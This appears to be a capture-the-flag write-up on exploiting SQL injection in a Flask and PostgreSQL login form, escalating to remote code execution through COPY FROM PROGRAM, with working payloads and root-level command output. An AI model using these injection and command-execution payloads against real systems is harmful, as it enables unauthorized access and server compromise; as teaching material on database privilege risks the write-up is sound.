---
title: "Web SQL Injection RCE"
date: "2024-03-15"
tags: ["web", "sql-injection", "rce"]
writtenBy: "2"
summary: "Leveraging a niche SQL injection vector to gain remote code execution on a hardened web server."
cover: "/images/writeups/sql_injection.png"
---

## Introduction

In this challenge, we are presented with a simple login form that seems secure at first glance. However, deeper analysis reveals a vulnerability in how the backend constructs its SQL queries.

## Initial Reconnaissance

The application runs on a Python Flask backend with a PostgreSQL database. We confirmed this by analyzing the HTTP headers and error messages.

```python
import requests

url = "http://target.com/login"
data = {"username": "admin' --", "password": "password"}
response = requests.post(url, data=data)

print(response.text)
```

## Exploring the SQL Injection

The injection point is in the `username` field. Standard payloads were blocked by a WAF, so we had to use some evasion techniques.

### Bypass Strategy

We used standard URL encoding to bypass the basic filter.

```sql
' UNION SELECT NULL, NULL, version() --
```

This successfully returned the database version: `PostgreSQL 14.5`.

## Escalating to RCE

Since we are running as a superuser (which we confirmed via `current_user`), we can leverage `COPY FROM PROGRAM` to execute system commands.

```sql
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'id';
SELECT * FROM shell;
```

The output was:

```text
uid=0(root) gid=0(root) groups=0(root)
```

## Conclusion

This challenge demonstrated the danger of running database services with excessive privileges. Even a simple SQL injection can escalate to full system compromise if the database user has OS-level execution rights.
